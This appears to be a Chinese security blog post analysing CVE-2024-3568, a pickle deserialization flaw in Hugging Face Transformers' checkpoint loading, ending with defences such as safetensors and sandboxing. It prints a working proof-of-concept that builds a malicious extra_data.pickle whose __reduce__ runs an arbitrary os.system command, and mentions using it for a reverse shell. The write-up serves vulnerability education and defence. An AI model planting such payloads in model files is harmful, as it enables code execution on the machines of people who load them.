---
title: 大模型的反序列化导致的RCE漏洞
url: https://mp.weixin.qq.com/s?__biz=MzU0MzkzOTYzOQ==&mid=2247489539&idx=1&sn=69e2563458072584247038ace3c47897&chksm=fb02955bcc751c4dec3afdef0f6425ec619901675928a3ded7cfbdd682e2fe9592a5ede95d5d&scene=58&subscene=0#rd
source: 黑伞安全
date: 2024-12-06
fetch_date: 2025-10-06T19:39:36.115524
---

# 大模型的反序列化导致的RCE漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/apmYTPAKhlXjfQHYK6YlZsG25iaibADeqw2jRCZlicHKnPBEhlUibFhwRjwLVNFIsvpB3sh3eTJIxaLSiaeQZdOna8w/0?wx_fmt=jpeg)

# 大模型的反序列化导致的RCE漏洞

sule01u

黑伞安全

# 大模型的反序列化导致的RCE漏洞

> 话说最近字节实习生通过编写、篡改代码等形式恶意攻击团队研究项目模型训练任务的事闹的沸沸扬扬，那气氛都到这了，我们来聊聊大模型的rce漏洞吧

## 引言

这可以从今年的CVE-2024-3568开始聊聊， CVE-2024-3568是Huggingface的Transformers库中存在的一个反序列化漏洞，影响版本为4.38.0及之前的版本。该漏洞源于TFPreTrainedModel类的load\_repo\_checkpoint()函数在加载检查点时，使用了Python的pickle模块反序列化不受信任的数据，导致攻击者可以通过构造恶意的序列化有效载荷，实现任意代码执行。

**所以呢**

展开人话就是：攻击者可以创建一个包含恶意`extra_data.pickle`文件的检查点目录。当受害者在模型训练过程中加载该检查点时，`pickle.load()`函数会反序列化`extra_data.pickle`文件，触发其中的恶意代码，从而在受害者的机器上执行任意指令。

**我不信，你演示一下**

OK, 来梳理一遍漏洞出发流程 ⬇️

## CVE-2024-3568 漏洞触发流程

**功能背景：模型检查点加载**

* • 在机器学习中，检查点`Checkpoint`用于保存模型训练的中间状态，以便随时恢复训练或进行推理。
* • `Transformers` 库的 `TFPreTrainedModel` 类提供了 `load_repo_checkpoint()` 方法，用于从一个目录中加载检查点数据。
* • 该方法使用 `Python` 的 `pickle` 模块来反序列化检查点的附加数据文件 `extra_data.pickle`。

**核心问题：直接反序列化用户提供的文件**

* • `pickle` 是 `Python` 的一个用于序列化和反序列化 `Python` 对象, `pickle` 的反序列化过程会执行序列化对象中的任意代码。
* • 在 `load_repo_checkpoint()` 中，直接使用了 `pickle.load()` 方法来加载用户提供的 `extra_data.pickle` 文件。
* • 如果攻击者能够控制检查点目录的内容，就可以将恶意代码嵌入到 `extra_data.pickle` 文件中造成反序列化。

**示例代码如下**

* • 模拟受害者加载恶意的checkpoint

```
from tensorflow.keras.optimizers import Adam
from transformers import TFAutoModel

# 加载一个正常的模型
model = TFAutoModel.from_pretrained('bert-base-uncased')
model.compile(optimizer=Adam(learning_rate=5e-5), loss='sparse_categorical_crossentropy', metrics=['accuracy'])

# 把参数修改为checkpoint所在的路径
model.load_repo_checkpoint('rce-checkpoint')
```

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXjfQHYK6YlZsG25iaibADeqwm09dXEfgD5ZXEsDGhBKcQRSib8vfdhfgBF8MUibFvYneRiaRhj3WAOibRw/640?wx_fmt=png&from=appmsg "null")

* • 我们继续跟进上面的`load_repo_checkpoint`函数

```
def load_repo_checkpoint(self, repo_path_or_name):
ifgetattr(self,"optimizer",None)isNone:
raiseRuntimeError(
"Checkpoint loading failed as no optimizer is attached to the model. "
"This is most likely caused by the model not being compiled."
)
if os.path.isdir(repo_path_or_name):
        local_dir = repo_path_or_name
else:
        repo_files = list_repo_files(repo_path_or_name)
for file in("checkpoint/weights.h5","checkpoint/extra_data.pickle"):
if file notin repo_files:
raiseFileNotFoundError(f"Repo {repo_path_or_name} does not contain checkpoint file {file}!")
        repo =Repository(repo_path_or_name.split("/")[-1], clone_from=repo_path_or_name)
        local_dir = repo.local_dir

# 确保仓库中确实存在检查点
    checkpoint_dir = os.path.join(local_dir,"checkpoint")
    weights_file = os.path.join(checkpoint_dir,"weights.h5")
ifnot os.path.isfile(weights_file):
raiseFileNotFoundError(f"Could not find checkpoint file weights.h5 in repo {repo_path_or_name}!")
    extra_data_file = os.path.join(checkpoint_dir,"extra_data.pickle")
ifnot os.path.isfile(extra_data_file):
raiseFileNotFoundError(f"Could not find checkpoint file extra_data.pickle in repo {repo_path_or_name}!")

# ----重点在这里：加载模型的权重和优化器状态-----
    self.load_weights(weights_file)
withopen(extra_data_file,"rb")as f:
        extra_data = pickle.load(f)# ！！！pickle.load()
    self.optimizer.set_weights(extra_data["optimizer_state"])

return{"epoch": extra_data["epoch"]}
```

现在真相大白了，读取了`extra_data.pickle`文件并反序列化

那我们下一个问题是：`extra_data.pickle`文件里面是啥？

让我们看看`extra_data.pickle`文件是怎么生成的 ⬇️

```
def generate_extra_data_pickle(filepath, command):
classCommandExecute:
def__reduce__(self):
return os.system,(command,)

    poc =CommandExecute()
withopen(filepath,'wb')as fp:
        pickle.dump(poc, fp)
```

根据poc代码可知：在 `pickle.load(f)` 反序列化时，`__reduce__` 会被调用，`return os.system, (command,)` 会导致指定的命令 `command` 被执行。（反弹shell拿权限啦 - \_ -

**所以顺下来，漏洞利用过程就是：**

1. 1. 攻击者使用上面的 `generate_extra_data_pickle`  函数生成包含恶意命令的`extra_data.pickle` 文件。
2. 2. 将该文件放入目标仓库或本地文件路径。
3. 3. 受害者运行 `load_repo_checkpoint` 并加载恶意文件。
4. 4. `pickle.load(f)` 执行反序列化，触发 `__reduce__`，执行其中的恶意命令。

## 扩展总结

以 transformers 库为例，已经发现了多起相关的安全漏洞：

* • `CVE-2024-3568`：该漏洞影响 transformers 库版本低于 4.38.0，主要利用 TFAutoModel 的反序列化过程触发恶意代码执行。
* • `CVE-2023-7018`：影响版本低于 4.36.0 的 transformers 库，tokenizer 解析存在类似的反序列化漏洞。
* • `CVE-2023-6730`：涉及 RagRetriever.from\_pretrained 方法，影响版本同样是低于 4.36.0。

这些漏洞的存在，意味着**如果攻击者能够控制模型文件内容 并且 模型文件被受害者使用了**，便可通过反序列化行为，在模型加载的瞬间就可以触发恶意代码执行。

不过大模型时代，自己从头训模型对大多数人来说是不现实的，重点可能需要放在加载预训练权重的时候怎么避免**权重文件被植入恶意代码的风险上**

## 如何防御 -> safetensors

`safetensors` 是 `Hugging Face` 推出的一个专门存储模型权重的文件格式，主要目标是**安全性**和**高效性**。

**为什么安全：**

* • **只存储张量数据**：`safetensors` 仅存储模型的张量（weights），不包含任何其他 Python 对象。
* • **无需解释器解析**：文件的解析完全由 Rust 或其他安全语言实现，而非依赖 Python 的动态解释器（如 pickle）。
* • **防止任意代码执行**：由于文件格式不支持代码对象，攻击者无法在文件中注入恶意代码。

**其他措施：**

* • 加载前验证文件完整性（如哈希校验或签名验证）。
* • 避免加载未验证来源的模型文件。
* • 限制加载模型的运行环境（如沙盒或虚拟环境）

![](https://mmbiz.qpic.cn/mmbiz_gif/apmYTPAKhlXjfQHYK6YlZsG25iaibADeqwfXbGtBib3Q6NnzdDDjw1cMBY1HAibcc0yFnO0gcTN36eFBBKvOUlKydw/640?wx_fmt=gif&from=appmsg)

**欢迎关注不懂安全⬇️**

如果你是一个长期主义者，欢迎加入我的知识星球,我们一起冲，一起学。每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款。

![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpP42WfBo5hTxoaTEtBuXQeLUWtmGfA1ic3HbXgu686nVcRvSeiaVWmboVVkiaM9MrVY19LZ9x3e6low/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

黑伞安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过